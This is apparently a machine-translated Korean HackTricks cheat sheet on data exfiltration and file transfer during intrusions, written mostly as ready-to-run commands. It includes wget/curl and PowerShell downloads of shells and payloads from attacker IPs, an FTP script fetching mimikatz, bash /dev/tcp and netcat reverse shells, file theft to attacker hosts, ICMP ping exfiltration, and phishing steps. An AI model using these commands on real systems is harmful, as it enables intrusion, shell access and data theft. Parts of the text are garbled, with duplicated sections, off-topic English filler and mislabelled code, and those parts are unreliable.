# 유출

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

가장 중요한 취약점을 찾아서 빠르게 수정할 수 있습니다. Intruder는 공격 대상을 추적하고 적극적인 위협 스캔을 실행하여 API부터 웹 앱 및 클라우드 시스템까지 전체 기술 스택에서 문제를 찾습니다. [**무료로 시도해보세요**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 오늘.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## 정보 유출에 자주 허용되는 도메인

악용할 수 있는 자주 허용되는 도메인을 찾으려면 [https://lots-project.com/](https://lots-project.com/)을 확인하세요.

## 복사\&붙여넣기 Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**

윈도우 시스템에서 데이터를 유출하는 여러 가지 방법이 있습니다. 이러한 방법 중 일부는 다음과 같습니다.

1. 이메일 전송: 데이터를 압축하거나 암호화하여 이메일 첨부 파일로 전송할 수 있습니다. 이 방법은 데이터 양이 적을 때 유용합니다.

2. 원격 서버로의 업로드: 데이터를 원격 서버로 업로드하여 유출할 수 있습니다. 이를 위해 FTP, SCP, SFTP 등의 프로토콜을 사용할 수 있습니다.

3. 클라우드 스토리지: 클라우드 스토리지 서비스를 사용하여 데이터를 업로드하고 공유할 수 있습니다. Dropbox, Google Drive, OneDrive 등이 대표적인 예입니다.

4. 웹 서비스를 통한 데이터 전송: 데이터를 웹 서비스를 통해 전송할 수 있습니다. 이를 위해 POST 요청을 사용하거나 파일 업로드 기능을 이용할 수 있습니다.

5. USB 드라이브: 데이터를 USB 드라이브에 저장하여 물리적으로 유출할 수 있습니다. 이 방법은 시스템에 직접 접근할 수 있는 경우에 유용합니다.

6. 네트워크 프로토콜을 이용한 데이터 전송: 데이터를 네트워크 프로토콜을 이용하여 전송할 수 있습니다. 예를 들어, ICMP, DNS, HTTP 등의 프로토콜을 사용할 수 있습니다.

7. 악성 코드를 이용한 데이터 유출: 악성 코드를 사용하여 데이터를 유출할 수 있습니다. 이를 위해 백도어, 트로이목마, 스파이웨어 등을 사용할 수 있습니다.

이러한 방법들은 데이터 유출을 위해 다양한 기술과 도구를 사용할 수 있습니다. 따라서, 특정 상황에 맞는 적절한 방법을 선택하여 데이터를 유출할 수 있습니다.
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
## HTTP

**리눅스**
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**

윈도우 시스템에서 데이터를 유출하는 여러 가지 방법이 있습니다. 이러한 방법 중 일부는 다음과 같습니다.

1. 이메일 전송: 데이터를 압축하거나 암호화하여 이메일 첨부 파일로 전송할 수 있습니다. 이 방법은 데이터 양이 적을 때 유용합니다.

2. 원격 서버로의 업로드: 데이터를 원격 서버로 업로드하여 유출할 수 있습니다. 이를 위해 FTP, SCP, SFTP 등의 프로토콜을 사용할 수 있습니다.

3. 클라우드 스토리지: 클라우드 스토리지 서비스를 사용하여 데이터를 업로드하고 공유할 수 있습니다. Dropbox, Google Drive, OneDrive 등이 대표적인 예입니다.

4. 웹 서비스를 통한 데이터 전송: 데이터를 웹 서비스를 통해 전송할 수 있습니다. 이를 위해 POST 요청을 사용하거나 파일 업로드 기능을 이용할 수 있습니다.

5. USB 드라이브: 데이터를 USB 드라이브에 저장하여 물리적으로 유출할 수 있습니다. 이 방법은 시스템에 직접 접근할 수 있는 경우에 유용합니다.

6. 네트워크 프로토콜을 이용한 데이터 전송: 데이터를 네트워크 프로토콜을 이용하여 전송할 수 있습니다. 예를 들어, ICMP, DNS, HTTP 등의 프로토콜을 사용할 수 있습니다.

7. 악성 코드를 이용한 데이터 유출: 악성 코드를 사용하여 데이터를 유출할 수 있습니다. 이를 위해 백도어, 트로이 목마 등의 기술을 사용할 수 있습니다.

이러한 방법들은 데이터 유출을 위해 사용될 수 있지만, 합법적인 목적으로 사용되는 경우도 있습니다. 따라서 항상 법적인 측면을 고려하고 유출할 데이터에 대한 적절한 권한과 동의를 확인해야 합니다.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### 파일 업로드

* [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
* [**GET 및 POST (헤더 포함)를 출력하는 SimpleHttpServer**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
* Python 모듈 [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **HTTPS 서버**

An HTTPS server is a type of server that uses the HTTPS (Hypertext Transfer Protocol Secure) protocol to secure the communication between the server and the client. It provides encryption and authentication mechanisms to ensure that the data transmitted between the two parties is secure and cannot be intercepted or tampered with by attackers.

To set up an HTTPS server, you need to obtain an SSL/TLS certificate from a trusted certificate authority (CA). This certificate is used to verify the identity of the server and establish a secure connection with the client. Once the certificate is obtained, it needs to be installed on the server and configured to enable HTTPS communication.

HTTPS servers are commonly used for secure online transactions, such as e-commerce websites, online banking, and other applications that require the transmission of sensitive information. By using HTTPS, the server can protect the confidentiality and integrity of the data being transmitted, ensuring that it remains private and unaltered during transit.

Setting up an HTTPS server involves configuring the server software (such as Apache or Nginx) to listen on the HTTPS port (usually port 443) and handle incoming HTTPS requests. The server software also needs to be configured with the SSL/TLS certificate and other security settings to ensure a secure connection.

In addition to providing secure communication, HTTPS servers can also be configured to enforce certain security measures, such as requiring client certificates for authentication, implementing strict cipher suites, and enabling HTTP Strict Transport Security (HSTS) to prevent downgrade attacks.

Overall, HTTPS servers play a crucial role in securing online communication and protecting sensitive data from unauthorized access. By implementing proper security measures and following best practices, organizations can ensure that their HTTPS servers provide a strong defense against potential threats.
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
print(request.get_json())
return "OK"
if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
## FTP

### FTP 서버 (파이썬)

```python
import socket
import os

def send_file(file_path, host, port):
    # 파일 이름 추출
    file_name = os.path.basename(file_path)

    # 소켓 생성
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # 서버에 연결
    s.connect((host, port))

    # 파일 열기
    with open(file_path, 'rb') as f:
        # 파일 데이터 읽기
        data = f.read(1024)

        # 파일 데이터 전송
        while data:
            s.send(data)
            data = f.read(1024)

    # 소켓 닫기
    s.close()

    print(f"File {file_name} sent successfully!")

def main():
    # 파일 경로
    file_path = "/path/to/file.txt"

    # FTP 서버 정보
    host = "ftp.example.com"
    port = 21

    # 파일 전송
    send_file(file_path, host, port)

if __name__ == "__main__":
    main()
```

위의 코드는 Python을 사용하여 FTP 서버에 파일을 전송하는 예시입니다.

```python
import socket
import os

def send_file(file_path, host, port):
    # Extract the file name
    file_name = os.path.basename(file_path)

    # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the server
    s.connect((host, port))

    # Open the file
    with open(file_path, 'rb') as f:
        # Read the file data
        data = f.read(1024)

        # Send the file data
        while data:
            s.send(data)
            data = f.read(1024)

    # Close the socket
    s.close()

    print(f"File {file_name} sent successfully!")

def main():
    # File path
    file_path = "/path/to/file.txt"

    # FTP server information
    host = "ftp.example.com"
    port = 21

    # Send the file
    send_file(file_path, host, port)

if __name__ == "__main__":
    main()
```

The above code is an example of sending a file to an FTP server using Python.
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### FTP 서버 (NodeJS)

#### FTP 서버란?

FTP(파일 전송 프로토콜) 서버는 파일 전송을 위한 네트워크 프로토콜입니다. 이 서버는 클라이언트가 파일을 업로드하고 다운로드할 수 있도록 해줍니다. NodeJS를 사용하여 FTP 서버를 구축할 수 있습니다.

#### FTP 서버 구축하기

1. `ftp-srv` 패키지를 설치합니다.

```bash
npm install ftp-srv
```

2. 다음과 같이 NodeJS 코드를 작성하여 FTP 서버를 구축합니다.

```javascript
const FtpSrv = require('ftp-srv');

const ftpServer = new FtpSrv({
  url: 'ftp://localhost:21',
  pasv_url: 'ftp://localhost:3000',
  pasv_min: 3001,
  pasv_max: 3009,
});

ftpServer.on('login', ({ connection, username, password }, resolve, reject) => {
  if (username === 'admin' && password === 'password') {
    resolve({ root: '/path/to/ftp/files' });
  } else {
    reject(new Error('Authentication failed'));
  }
});

ftpServer.listen()
  .then(() => {
    console.log('FTP server started');
  })
  .catch((error) => {
    console.error('Error starting FTP server:', error);
  });
```

위 코드에서 `url`은 FTP 서버의 URL을, `pasv_url`은 패시브 모드를 위한 URL을 설정합니다. `pasv_min`과 `pasv_max`는 패시브 모드 포트 범위를 지정합니다. `root`는 클라이언트가 접근할 수 있는 파일 경로를 설정합니다.

3. FTP 서버를 실행합니다.

```bash
node ftp-server.js
```

#### FTP 서버에 접속하기

FTP 클라이언트를 사용하여 FTP 서버에 접속할 수 있습니다. 일반적으로 FTP 클라이언트는 파일 전송을 위해 사용됩니다.

FTP 클라이언트를 사용하여 FTP 서버에 접속하려면 다음과 같은 정보가 필요합니다.

- 호스트: FTP 서버의 호스트 주소
- 포트: FTP 서버의 포트 번호 (기본값은 21)
- 사용자 이름: FTP 서버에 로그인하기 위한 사용자 이름
- 비밀번호: FTP 서버에 로그인하기 위한 비밀번호

FTP 클라이언트를 사용하여 FTP 서버에 접속한 후에는 파일을 업로드하거나 다운로드할 수 있습니다.
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### FTP 서버 (pure-ftp)

#### FTP 서버란?
FTP(파일 전송 프로토콜) 서버는 파일 전송을 위한 네트워크 프로토콜입니다. pure-ftp는 FTP 서버의 한 종류로, 안정적이고 보안성이 높은 서비스를 제공합니다.

#### FTP 서버를 이용한 데이터 유출
FTP 서버를 이용하여 데이터를 유출하는 방법은 다양합니다. 일반적으로는 다음과 같은 과정을 거칩니다.

1. FTP 서버에 접속하기 위해 필요한 정보를 수집합니다. 이는 호스트 주소, 포트 번호, 사용자 이름 및 암호 등을 포함합니다.
2. FTP 클라이언트를 사용하여 FTP 서버에 접속합니다.
3. 데이터를 업로드하거나 다운로드하여 FTP 서버와 데이터를 교환합니다.
4. 데이터 유출이 완료되면 FTP 서버와의 연결을 종료합니다.

#### FTP 서버를 통한 데이터 유출 방지
FTP 서버를 통한 데이터 유출을 방지하기 위해 다음과 같은 조치를 취할 수 있습니다.

1. 안전한 암호 정책을 사용하여 FTP 서버에 접속하는 사용자의 암호를 강화합니다.
2. 방화벽을 설정하여 외부에서의 불법적인 접근을 차단합니다.
3. FTP 서버의 로그를 모니터링하여 이상한 활동을 감지하고 대응합니다.
4. 데이터 전송 시 암호화 프로토콜을 사용하여 데이터의 기밀성을 보호합니다.

#### FTP 서버를 이용한 데이터 유출의 위험성
FTP 서버를 이용한 데이터 유출은 중요한 정보가 유출될 수 있는 심각한 위험을 초래할 수 있습니다. 따라서 FTP 서버의 보안 설정을 강화하고, 데이터 전송 시 암호화를 적용하여 보안을 강화해야 합니다.
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### **Windows** 클라이언트

Windows 클라이언트는 다양한 방법으로 데이터를 외부로 유출할 수 있습니다. 이 섹션에서는 일반적인 데이터 유출 기술에 대해 설명합니다.

#### **1. 이메일**

이메일은 데이터를 외부로 전송하는 가장 일반적인 방법 중 하나입니다. Windows 클라이언트에서는 다음과 같은 방법으로 이메일을 통해 데이터를 유출할 수 있습니다.

- 이메일 클라이언트를 사용하여 데이터를 첨부 파일로 보내기
- 명령 프롬프트 또는 PowerShell을 사용하여 이메일을 보내기

#### **2. 웹 브라우저**

웹 브라우저를 통해 데이터를 외부로 전송할 수도 있습니다. Windows 클라이언트에서는 다음과 같은 방법으로 웹 브라우저를 사용하여 데이터를 유출할 수 있습니다.

- 웹 기반 이메일 서비스를 사용하여 데이터를 전송하기
- 파일 호스팅 서비스를 사용하여 데이터를 업로드하기
- 웹 폼을 통해 데이터를 전송하기

#### **3. 클라우드 스토리지**

클라우드 스토리지 서비스를 사용하여 데이터를 외부로 전송할 수도 있습니다. Windows 클라이언트에서는 다음과 같은 방법으로 클라우드 스토리지를 사용하여 데이터를 유출할 수 있습니다.

- 클라우드 스토리지 클라이언트를 사용하여 데이터를 업로드하기
- 명령 프롬프트 또는 PowerShell을 사용하여 클라우드 스토리지에 데이터를 업로드하기

#### **4. USB 드라이브**

USB 드라이브를 사용하여 데이터를 외부로 전송할 수도 있습니다. Windows 클라이언트에서는 다음과 같은 방법으로 USB 드라이브를 사용하여 데이터를 유출할 수 있습니다.

- 데이터를 USB 드라이브에 복사하기
- 명령 프롬프트 또는 PowerShell을 사용하여 USB 드라이브에 데이터를 복사하기

#### **5. 네트워크**

네트워크를 통해 데이터를 외부로 전송할 수도 있습니다. Windows 클라이언트에서는 다음과 같은 방법으로 네트워크를 사용하여 데이터를 유출할 수 있습니다.

- 파일 전송 프로토콜 (FTP)을 사용하여 데이터를 전송하기
- 원격 복사 프로토콜 (RCP)을 사용하여 데이터를 전송하기
- 원격 데스크톱 프로토콜 (RDP)을 사용하여 데이터를 전송하기

#### **6. 기타 방법**

Windows 클라이언트에서는 다양한 기타 방법을 사용하여 데이터를 외부로 전송할 수 있습니다. 이러한 방법에는 다음이 포함됩니다.

- 인쇄를 통해 데이터를 유출하기
- 스마트폰 또는 태블릿을 사용하여 데이터를 전송하기
- 압축 파일을 생성하여 데이터를 유출하기

이러한 데이터 유출 기술을 사용하여 Windows 클라이언트에서 데이터를 외부로 유출할 수 있습니다. 그러나 항상 법적인 제약 사항을 준수하고 윤리적인 측면을 고려해야 합니다.
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

가장 중요한 취약점을 찾아서 빠르게 수정할 수 있습니다. Intruder는 공격 대상을 추적하고 예방적인 위협 스캔을 실행하여 API부터 웹 애플리케이션 및 클라우드 시스템까지 전체 기술 스택에서 문제를 찾습니다. [**무료로 시도해보세요**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 오늘.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## SMB

Kali를 서버로 사용
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
또는 samba를 사용하여 smb 공유를 생성하십시오:
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes
#Start samba
service smbd restart
```
# Exfiltration

Exfiltration is the process of unauthorized data transfer from a target system to an external location. This can be a critical step in a hacking operation, as it allows the attacker to steal sensitive information from the compromised system.

There are several methods that can be used for exfiltration, depending on the target system and the available resources. Here are some common techniques:

## 1. File Transfer Protocols

File Transfer Protocol (FTP), Secure Copy Protocol (SCP), and Hypertext Transfer Protocol (HTTP) are commonly used protocols for transferring files over a network. Attackers can leverage these protocols to exfiltrate data by uploading it to a remote server.

## 2. Email

Email is another common method for exfiltrating data. Attackers can send sensitive information as attachments or embed it within the body of an email. They can also use steganography techniques to hide the data within image or audio files.

## 3. DNS Tunneling

DNS tunneling involves encapsulating data within DNS queries and responses. Attackers can use this technique to bypass firewalls and exfiltrate data by sending DNS queries to a controlled server.

## 4. Cloud Storage

Cloud storage services, such as Dropbox or Google Drive, can be used to exfiltrate data. Attackers can upload sensitive information to these platforms and then access it from a different location.

## 5. Covert Channels

Covert channels are hidden communication channels that can be used to exfiltrate data. These channels can be created using various techniques, such as manipulating network protocols or exploiting vulnerabilities in the target system.

It is important for organizations to implement strong security measures to prevent exfiltration. This includes monitoring network traffic, restricting access to sensitive data, and regularly patching vulnerabilities.
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
## SCP

공격자는 SSHd가 실행 중이어야 합니다.
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```
## SSHFS

피해자가 SSH를 사용하고 있다면, 공격자는 피해자의 디렉토리를 공격자에게 마운트할 수 있습니다.
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC

NC는 네트워크 통신을 위한 강력한 도구입니다. 이 도구를 사용하여 데이터를 전송하고 수신할 수 있습니다. NC를 사용하여 데이터를 외부로 유출하는 여러 가지 방법이 있습니다.

### 1. 파일 전송

NC를 사용하여 파일을 전송할 수 있습니다. 송신자는 다음 명령을 사용하여 파일을 전송합니다.

```bash
nc -w 3 <수신자 IP 주소> <수신자 포트 번호> < 파일명
```

수신자는 다음 명령을 사용하여 파일을 수신합니다.

```bash
nc -l -p <수신자 포트 번호> > 파일명
```

### 2. 스크린샷 캡처

NC를 사용하여 원격 시스템의 스크린샷을 캡처할 수 있습니다. 다음 명령을 사용하여 스크린샷을 캡처하고 파일로 저장합니다.

```bash
nc -l -p <수신자 포트 번호> | xwd -root -display :0.0 -out 파일명.xwd
```

### 3. 원격 명령 실행

NC를 사용하여 원격 시스템에서 명령을 실행할 수 있습니다. 다음 명령을 사용하여 명령을 실행합니다.

```bash
nc -w 3 <수신자 IP 주소> <수신자 포트 번호> | /bin/bash
```

### 4. 데이터베이스 덤프

NC를 사용하여 데이터베이스의 덤프를 생성하고 외부로 전송할 수 있습니다. 다음 명령을 사용하여 데이터베이스 덤프를 생성하고 파일로 저장합니다.

```bash
mysqldump -u <사용자 이름> -p<비밀번호> <데이터베이스 이름> | nc -w 3 <수신자 IP 주소> <수신자 포트 번호>
```

### 5. 원격 로그인

NC를 사용하여 원격 시스템에 로그인할 수 있습니다. 다음 명령을 사용하여 원격 시스템에 로그인합니다.

```bash
nc -l -p <수신자 포트 번호> -e /bin/bash
```

이러한 방법을 사용하여 NC를 통해 데이터를 외부로 유출할 수 있습니다. 그러나 합법적인 목적으로만 사용해야 하며, 불법적인 목적으로 사용해서는 안 됩니다.
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
```bash
cat /path/to/file > /dev/tcp/attacker_ip/attacker_port
```

This command allows you to download a file from the victim machine to your machine. Replace `/path/to/file` with the actual path of the file on the victim machine. Replace `attacker_ip` with your IP address and `attacker_port` with the port number you want to use for the connection.

### Upload file to victim

```bash
cat /path/to/file | nc -l -p attacker_port
```

This command allows you to upload a file from your machine to the victim machine. Replace `/path/to/file` with the actual path of the file on your machine. Replace `attacker_port` with the port number you want to use for the connection.

### Execute command on victim

```bash
echo "command" > /dev/tcp/attacker_ip/attacker_port
```

This command allows you to execute a command on the victim machine. Replace `command` with the actual command you want to execute. Replace `attacker_ip` with your IP address and `attacker_port` with the port number you want to use for the connection.

### Reverse shell

```bash
bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1
```

This command establishes a reverse shell connection with the victim machine. Replace `attacker_ip` with your IP address and `attacker_port` with the port number you want to use for the connection.
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### 피해자에게 파일 업로드하기

To exfiltrate data from a victim's system, you can upload a file to their machine. This can be done using various methods, such as exploiting vulnerabilities in web applications or using social engineering techniques to trick the victim into downloading and executing a malicious file.

#### Exploiting Web Applications

1. Identify potential vulnerabilities in the target's web applications, such as file upload functionality or insecure file permissions.
2. Craft a malicious file that will be uploaded to the target's system. This file can contain a payload that will allow you to gain remote access or execute commands on the victim's machine.
3. Use the identified vulnerability to upload the malicious file to the target's system. This can be done by bypassing file type restrictions, manipulating file extensions, or exploiting other weaknesses in the application's file upload functionality.
4. Once the file is successfully uploaded, you can access it remotely and retrieve the exfiltrated data.

#### Social Engineering Techniques

1. Create a convincing phishing email or message that appears to be from a trusted source.
2. Include a malicious file as an attachment or provide a link to download the file.
3. Persuade the victim to open the attachment or download the file by using social engineering techniques, such as urgency, curiosity, or fear.
4. Once the victim opens the file or executes the downloaded file, the malicious payload will be triggered, allowing you to gain access to their system and exfiltrate data.

Remember to always exercise caution and ensure that you have the necessary permissions and legal authorization before attempting any hacking activities.
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
## **ICMP**

ICMP(Internet Control Message Protocol)은 네트워크 장치 간에 제어 메시지를 교환하기 위해 사용되는 프로토콜입니다. ICMP는 주로 네트워크 문제를 진단하고 해결하기 위해 사용됩니다. 그러나 ICMP는 데이터를 전송하는 데에도 사용될 수 있습니다.

### **ICMP 캡슐화**

ICMP는 IP 패킷의 데이터 부분에 캡슐화됩니다. ICMP 메시지는 IP 헤더와 ICMP 헤더로 구성됩니다. ICMP 헤더에는 ICMP 메시지의 유형, 코드 및 체크섬 값이 포함됩니다.

### **ICMP 캡슐화를 이용한 데이터 유출**

ICMP 캡슐화를 이용하여 데이터를 유출하는 방법은 다음과 같습니다.

1. 데이터를 ICMP 메시지로 변환합니다.
2. ICMP 메시지를 IP 패킷에 캡슐화합니다.
3. IP 패킷을 ICMP 메시지를 포함한 ICMP Echo Request 메시지로 변환합니다.
4. ICMP Echo Request 메시지를 목적지로 전송합니다.
5. 목적지에서 ICMP Echo Reply 메시지를 수신합니다.
6. ICMP Echo Reply 메시지에서 데이터를 추출합니다.

### **ICMP 데이터 유출의 장단점**

ICMP 데이터 유출의 장점은 다음과 같습니다.

- ICMP는 대부분의 네트워크에서 허용되는 프로토콜이므로 방화벽이나 인트라넷에서 차단되지 않을 가능성이 높습니다.
- ICMP는 대부분의 운영 체제에서 기본적으로 활성화되어 있으므로 추가 설정이 필요하지 않습니다.

ICMP 데이터 유출의 단점은 다음과 같습니다.

- ICMP는 일반적으로 응답 시간이 길어지는 경우가 많으므로 데이터 전송 속도가 느릴 수 있습니다.
- ICMP는 일부 보안 장치에서 검출될 수 있으며, 네트워크 관리자에게 의심을 받을 수 있습니다.

### **ICMP 데이터 유출 도구**

ICMP 데이터 유출을 위해 다양한 도구가 사용될 수 있습니다. 일부 도구는 다음과 같습니다.

- **Icmpsh**: ICMP를 사용하여 데이터를 유출하는 도구입니다.
- **PingTunnel**: ICMP를 사용하여 데이터를 유출하는 도구입니다.
- **ICMPExfil**: ICMP를 사용하여 데이터를 유출하는 도구입니다.

### **ICMP 데이터 유출 방지**

ICMP 데이터 유출을 방지하기 위해 다음과 같은 조치를 취할 수 있습니다.

- 방화벽에서 ICMP 트래픽을 차단하거나 제한합니다.
- 네트워크 모니터링 도구를 사용하여 ICMP 데이터 유출을 탐지합니다.
- 보안 정책을 엄격하게 적용하여 ICMP 데이터 유출을 방지합니다.
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
if pkt.haslayer(ICMP):
if pkt[ICMP].type == 0:
data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## **SMTP**

SMTP 서버로 데이터를 전송할 수 있다면, 파이썬을 사용하여 데이터를 수신하는 SMTP를 생성할 수 있습니다:
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
## TFTP

기본적으로 XP와 2003에서는 (다른 시스템에서는 설치 중에 명시적으로 추가해야 함)

Kali에서 **TFTP 서버 시작**:
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**파이썬으로 구현한 TFTP 서버:**

```python
import socket
import struct

def tftp_server():
    # Create a UDP socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind(('0.0.0.0', 69))

    while True:
        # Receive the request packet from the client
        data, client_address = server_socket.recvfrom(516)
        opcode = struct.unpack('!H', data[:2])[0]

        # Check if it is a read request (RRQ)
        if opcode == 1:
            # Extract the filename from the request packet
            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')

            # Open the file in binary mode
            try:
                file = open(filename, 'rb')
                block_number = 1
                block_data = file.read(512)

                while block_data:
                    # Create the data packet
                    data_packet = struct.pack('!HH', 3, block_number) + block_data

                    # Send the data packet to the client
                    server_socket.sendto(data_packet, client_address)

                    # Receive the ACK packet from the client
                    ack_packet, client_address = server_socket.recvfrom(4)
                    ack_opcode = struct.unpack('!H', ack_packet[:2])[0]
                    ack_block_number = struct.unpack('!H', ack_packet[2:4])[0]

                    # Check if the ACK packet is valid
                    if ack_opcode == 4 and ack_block_number == block_number:
                        block_number += 1
                        block_data = file.read(512)
                    else:
                        break

                file.close()

            except FileNotFoundError:
                # Send the error packet (File Not Found) to the client
                error_packet = struct.pack('!HH', 5, 1) + b'File Not Found\x00'
                server_socket.sendto(error_packet, client_address)

        else:
            # Send the error packet (Illegal TFTP Operation) to the client
            error_packet = struct.pack('!HH', 5, 4) + b'Illegal TFTP Operation\x00'
            server_socket.sendto(error_packet, client_address)

    server_socket.close()

tftp_server()
```

이 코드는 파이썬으로 작성된 TFTP 서버입니다. TFTP는 파일 전송 프로토콜로, 클라이언트와 서버 간에 파일을 전송하는 데 사용됩니다.

이 서버는 UDP 소켓을 생성하고, 0.0.0.0의 69번 포트에 바인딩합니다. 클라이언트로부터 요청 패킷을 수신하고, 해당 패킷이 읽기 요청인지 확인합니다. 읽기 요청인 경우, 요청 패킷에서 파일 이름을 추출하고 해당 파일을 이진 모드로 엽니다.

파일을 블록 단위로 읽어서 데이터 패킷을 생성하고, 클라이언트에게 전송합니다. 클라이언트로부터 ACK 패킷을 수신하고, ACK 패킷이 유효한지 확인한 후 다음 블록을 읽어서 전송합니다. 이 과정을 반복하여 파일 전송을 완료합니다.

